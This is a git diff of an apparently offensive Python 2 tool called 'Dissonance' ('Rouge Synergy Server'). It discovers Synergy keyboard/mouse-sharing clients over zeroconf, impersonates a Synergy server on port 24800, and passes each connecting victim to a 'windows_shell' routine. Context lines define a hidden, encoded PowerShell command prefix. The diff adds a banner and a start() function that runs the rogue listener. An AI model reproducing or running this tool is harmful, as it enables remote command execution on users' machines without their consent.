@@ -5,7 +5,22 @@ import socket
 import logging
 from thread import *
 from time import sleep
+from scapy.all import *
 from zeroconf import ServiceBrowser, ServiceStateChange, ServiceInfo, Zeroconf
+
+def banner():
+    banner = '''  _____  _
+ |  __ \(_)
+ | |  | |_ ___ ___  ___  _ __   __ _ _ __   ___ ___
+ | |  | | / __/ __|/ _ \| '_ \ / _` | '_ \ / __/ _ \\
+ | |__| | \__ \__ \ (_) | | | | (_| | | | | (_|  __/
+ |_____/|_|___/___/\___/|_| |_|\__,_|_| |_|\___\___|
+
+              Rouge Synergy Server
+                     ~n00py~
+                     '''
+
+    print (banner)
 
 
 payload = "powershell.exe -NoP -sta -NonI -W Hidden -Enc "
@@ -131,7 +146,6 @@ def on_service_state_change(zeroconf, service_type, name, state_change):
         if "Client" in str(service_type):
             print("  New client Identified")
             print("  Name: " + name)
-    #print("Service %s of type %s state changed: %s" % (name, service_type, state_change))
     if state_change is ServiceStateChange.Added:
         info = zeroconf.get_service_info(service_type, name)
         if info:
@@ -149,29 +163,32 @@ def browser():
         logging.getLogger('zeroconf').setLevel(logging.DEBUG)
 
     zeroconf = Zeroconf()
-    print("\nBrowsing services, press Ctrl-C to exit...\n")
+
     serverBrowser = ServiceBrowser(zeroconf, "_synergyServerZeroconf._tcp.local.", handlers=[on_service_state_change])
     sleep(5)
     clientBrowser = ServiceBrowser(zeroconf, "_synergyClientZeroconf._tcp.local.", handlers=[on_service_state_change])
-
+    print("\nBrowsing services, press any key to start the server...\n")
+    trigger = True
     try:
-        while True:
-            sleep(0.1)
+        while trigger == True:
+            raw_input("")
+            trigger = False
+            start()
     except KeyboardInterrupt:
         pass
     finally:
-        zeroconf.close()
+        print ("")
+        #zeroconf.close()
 
+def start():
+    bonjour()
+    s = start_listener(24800)
+    while 1:
+        conn, addr = s.accept()
+        print ('Connected with ' + addr[0] + ':' + str(addr[1]))
+        start_new_thread(windows_shell, (conn,))
+    s.close()
 
-
-browser()
+banner()
+#browser()
 #bonjour()
-#s = start_listener(24800)
-
-while 1:
-    conn, addr = s.accept()
-    print ('Connected with ' + addr[0] + ':' + str(addr[1]))
-    start_new_thread(windows_shell, (conn,))
-
-
-s.close()
